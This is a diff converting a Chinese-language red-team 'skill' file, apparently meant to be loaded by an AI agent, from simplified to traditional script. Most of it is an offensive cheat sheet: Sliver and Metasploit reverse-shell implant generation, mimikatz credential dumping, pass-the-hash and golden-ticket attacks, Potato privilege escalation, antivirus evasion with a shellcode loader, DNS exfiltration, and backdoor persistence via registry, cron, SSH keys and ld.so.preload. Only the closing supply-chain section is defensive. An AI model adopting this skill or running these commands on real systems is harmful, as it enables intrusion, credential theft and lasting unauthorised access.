@@ -1,28 +1,28 @@
 ---
 name: red-team
-description: 红队攻击技术。PoC开发、C2框架、横向移动、权限提升、免杀技术。当用户提到红队、PoC、C2、横向移动、PTH、免杀、Cobalt Strike、Sliver、提权时使用。
+description: 紅隊攻擊技術。PoC開發、C2框架、橫向移動、許可權提升、免殺技術。當使用者提到紅隊、PoC、C2、橫向移動、PTH、免殺、Cobalt Strike、Sliver、提權時使用。
 ---
 
-# 🔥 赤焰秘典 · 红队攻击 (Red Team)
+# 🔥 赤焰秘典 · 紅隊攻擊 (Red Team)
 
 
-## 攻击链 (Kill Chain)
+## 攻擊鏈 (Kill Chain)
 
 ```
-侦察 → 武器化 → 投递 → 利用 → 安装 → C2 → 行动
+偵察 → 武器化 → 投遞 → 利用 → 安裝 → C2 → 行動
   │        │       │      │       │      │      │
-  └─ OSINT ─┴─ PoC ─┴─ 钓鱼 ─┴─ 提权 ─┴─ 持久 ─┴─ 横向
+  └─ OSINT ─┴─ PoC ─┴─ 釣魚 ─┴─ 提權 ─┴─ 持久 ─┴─ 橫向
 ```
 
-## PoC 开发
+## PoC 開發
 
-### 标准 PoC 结构
+### 標準 PoC 結構
 ```python
 #!/usr/bin/env python3
 """
-漏洞名称: CVE-XXXX-XXXX
-影响版本: x.x.x - x.x.x
-漏洞类型: RCE/SQLi/XSS/SSRF
+漏洞名稱: CVE-XXXX-XXXX
+影響版本: x.x.x - x.x.x
+漏洞型別: RCE/SQLi/XSS/SSRF
 """
 import requests
 import argparse
@@ -36,9 +36,9 @@ class POC:
         }
 
     def check(self) -> bool:
-        """无害检测"""
+        """無害檢測"""
         try:
-            # 使用延时、DNS外带等无害方式验证
+            # 使用延時、DNS外帶等無害方式驗證
             pass
         except Exception as e:
             return False
@@ -66,20 +66,20 @@ if __name__ == '__main__':
 
 ## C2 框架
 
-### Sliver (推荐开源)
+### Sliver (推薦開源)
 ```bash
-# 安装
+# 安裝
 curl https://sliver.sh/install | sudo bash
 
 # 生成 Implant
 sliver > generate --mtls 192.168.1.100 --os windows --save implant.exe
 sliver > generate --http 192.168.1.100 --os linux --save implant
 
-# 启动监听
+# 啟動監聽
 sliver > mtls --lhost 0.0.0.0 --lport 8888
 sliver > http --lhost 0.0.0.0 --lport 80
 
-# 会话操作
+# 會話操作
 sliver > sessions
 sliver > use SESSION_ID
 sliver (SESSION) > shell
@@ -92,7 +92,7 @@ sliver (SESSION) > upload local remote
 # 生成 Payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
 
-# 监听
+# 監聽
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > set LHOST 0.0.0.0
@@ -105,7 +105,7 @@ meterpreter > load kiwi
 meterpreter > creds_all
 ```
 
-### 简易 HTTP C2
+### 簡易 HTTP C2
 ```python
 # Server
 from flask import Flask, request, jsonify
@@ -127,7 +127,7 @@ def result(agent_id):
     return jsonify({"status": "ok"})
 ```
 
-## 横向移动
+## 橫向移動
 
 ### Pass-the-Hash (PTH)
 ```bash
@@ -146,17 +146,17 @@ sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
 
 ### Pass-the-Ticket (PTT)
 ```bash
-# 导出票据
+# 匯出票據
 mimikatz # sekurlsa::tickets /export
 
-# 注入票据
+# 注入票據
 mimikatz # kerberos::ptt ticket.kirbi
 
 # Rubeus
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-### Kerberos 攻击
+### Kerberos 攻擊
 ```bash
 # Kerberoasting
 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
@@ -168,7 +168,7 @@ GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP
 mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
 ```
 
-### 远程执行方法
+### 遠端執行方法
 ```bash
 # WinRM
 evil-winrm -i TARGET -u user -H HASH
@@ -181,43 +181,43 @@ Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}
 wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c whoami"
 ```
 
-## 权限提升
+## 許可權提升
 
-### Windows 提权
+### Windows 提權
 ```powershell
-# 信息收集
+# 資訊收集
 whoami /priv
 systeminfo
 net user
 net localgroup administrators
 
-# 常见提权路径
+# 常見提權路徑
 - SeImpersonatePrivilege → Potato系列
-- 服务配置错误 → 服务路径劫持
-- 计划任务 → 任务劫持
-- AlwaysInstallElevated → MSI提权
-- 未打补丁 → 内核漏洞
+- 服務配置錯誤 → 服務路徑劫持
+- 計劃任務 → 任務劫持
+- AlwaysInstallElevated → MSI提權
+- 未打補丁 → 核心漏洞
 
-# Potato 提权
+# Potato 提權
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
 PrintSpoofer.exe -i -c cmd
 GodPotato.exe -cmd "cmd /c whoami"
 ```
 
-### Linux 提权
+### Linux 提權
 ```bash
-# 信息收集
+# 資訊收集
 id
 uname -a
 cat /etc/passwd
 sudo -l
 find / -perm -4000 2>/dev/null
 
-# 常见提权路径
-- SUID 二进制 → GTFOBins
-- sudo 配置错误 → sudo提权
-- 内核漏洞 → DirtyPipe/DirtyCow
-- 定时任务 → cron劫持
+# 常見提權路徑
+- SUID 二進位制 → GTFOBins
+- sudo 配置錯誤 → sudo提權
+- 核心漏洞 → DirtyPipe/DirtyCow
+- 定時任務 → cron劫持
 - 容器逃逸 → Docker/K8s
 
 # SUID 利用
@@ -225,26 +225,26 @@ find / -perm -4000 2>/dev/null
 # 查 GTFOBins: https://gtfobins.github.io/
 ```
 
-## 免杀技术
+## 免殺技術
 
-### 基础免杀
+### 基礎免殺
 ```python
-# 1. 字符串混淆
+# 1. 字串混淆
 import base64
 payload = base64.b64encode(b"malicious_code").decode()
 exec(base64.b64decode(payload))
 
-# 2. 动态加载
+# 2. 動態載入
 import importlib
 module = importlib.import_module("os")
 getattr(module, "system")("whoami")
 
 # 3. 加密 Payload
 from Crypto.Cipher import AES
-# 运行时解密执行
+# 執行時解密執行
 ```
 
-### Shellcode 加载
+### Shellcode 載入
 ```python
 import ctypes
 
@@ -257,7 +257,7 @@ ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
 ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
 ```
 
-### 隐蔽通信
+### 隱蔽通訊
 ```python
 # DNS 隧道
 def dns_exfil(data, domain):
@@ -275,17 +275,17 @@ def domain_fronting(real_host, cdn_domain, data):
 
 ### Windows
 ```powershell
-# 注册表
+# 登錄檔
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"
 
-# 计划任务
+# 計劃任務
 schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon
 
-# 服务
+# 服務
 sc create backdoor binPath= "C:\backdoor.exe" start= auto
 
-# WMI 事件订阅
-# 进程启动时触发
+# WMI 事件訂閱
+# 程序啟動時觸發
 ```
 
 ### Linux
@@ -293,60 +293,60 @@ sc create backdoor binPath= "C:\backdoor.exe" start= auto
 # Crontab
 echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root
 
-# SSH 密钥
+# SSH 金鑰
 echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 
-# 服务
-# 创建 systemd service
+# 服務
+# 建立 systemd service
 
 # LD_PRELOAD
 echo "/tmp/evil.so" >> /etc/ld.so.preload
 ```
 
-## 工具清单
+## 工具清單
 
 | 工具 | 用途 |
 |------|------|
-| Sliver | 开源 C2 框架 |
-| Metasploit | 渗透测试框架 |
-| Cobalt Strike | 商业 C2 |
-| Impacket | Windows 协议工具 |
-| CrackMapExec | 批量横向 |
-| Mimikatz | 凭证提取 |
+| Sliver | 開源 C2 框架 |
+| Metasploit | 滲透測試框架 |
+| Cobalt Strike | 商業 C2 |
+| Impacket | Windows 協議工具 |
+| CrackMapExec | 批次橫向 |
+| Mimikatz | 憑證提取 |
 | Rubeus | Kerberos 工具 |
-| BloodHound | AD 路径分析 |
+| BloodHound | AD 路徑分析 |
 
-## 供应链安全
+## 供應鏈安全
 
-### 供应链攻击向量
+### 供應鏈攻擊向量
 ```
-源代码 → 构建 → 制品 → 分发 → 部署 → 运行
+原始碼 → 構建 → 製品 → 分發 → 部署 → 執行
    │       │      │      │      │      │
-   投毒    篡改   后门   劫持   提权   横向
+   投毒    篡改   後門   劫持   提權   橫向
 ```
 
-| 阶段 | 攻击方式 | 示例 |
+| 階段 | 攻擊方式 | 示例 |
 |------|----------|------|
-| 源代码 | 依赖投毒 | event-stream、ua-parser-js |
-| 构建 | CI/CD 劫持 | SolarWinds、CodeCov |
-| 制品 | 恶意包 | PyPI/npm 钓鱼包 |
+| 原始碼 | 依賴投毒 | event-stream、ua-parser-js |
+| 構建 | CI/CD 劫持 | SolarWinds、CodeCov |
+| 製品 | 惡意包 | PyPI/npm 釣魚包 |
 | 部署 | 配置篡改 | K8s YAML 注入 |
-| 运行 | 容器逃逸 | 特权容器、内核漏洞 |
+| 執行 | 容器逃逸 | 特權容器、核心漏洞 |
 
-### SBOM + 依赖扫描
+### SBOM + 依賴掃描
 ```bash
 # SBOM 生成 (Syft)
 syft nginx:latest -o cyclonedx-json > sbom.json
 
-# 漏洞扫描 (Trivy)
+# 漏洞掃描 (Trivy)
 trivy image --severity HIGH,CRITICAL nginx:latest
 trivy fs --scanners vuln,secret,misconfig .
 
-# 依赖扫描 (Grype)
+# 依賴掃描 (Grype)
 grype sbom:./sbom.json
 ```
 
-### 签名验证 (Sigstore/Cosign)
+### 簽名驗證 (Sigstore/Cosign)
 ```bash
 cosign sign --key cosign.key myregistry/myapp:v1.0
 cosign verify --key cosign.pub myregistry/myapp:v1.0
@@ -354,20 +354,20 @@ cosign attach sbom --sbom sbom.json myregistry/myapp:v1.0
 cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
 ```
 
-### SLSA 等级
+### SLSA 等級
 ```
-Level 1: 文档化构建  Level 2: 防篡改+签名来源
-Level 3: 安全平台+隔离构建  Level 4: 双方审查+密封构建
+Level 1: 文件化構建  Level 2: 防篡改+簽名來源
+Level 3: 安全平臺+隔離構建  Level 4: 雙方審查+密封構建
 ```
 
-### 供应链安全检查清单
+### 供應鏈安全檢查清單
 ```yaml
-源代码:
-  - [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描
-构建与制品:
-  - [ ] 托管CI/CD + 隔离构建 + 生成SBOM + 签名制品 + 漏洞扫描
-部署与运行:
-  - [ ] 验证签名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 运行时监控
+原始碼:
+  - [ ] 分支保護 + 程式碼審查 + 依賴鎖定 + 金鑰洩露掃描
+構建與製品:
+  - [ ] 託管CI/CD + 隔離構建 + 生成SBOM + 簽名製品 + 漏洞掃描
+部署與執行:
+  - [ ] 驗證簽名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 執行時監控
 ```
 
 ---
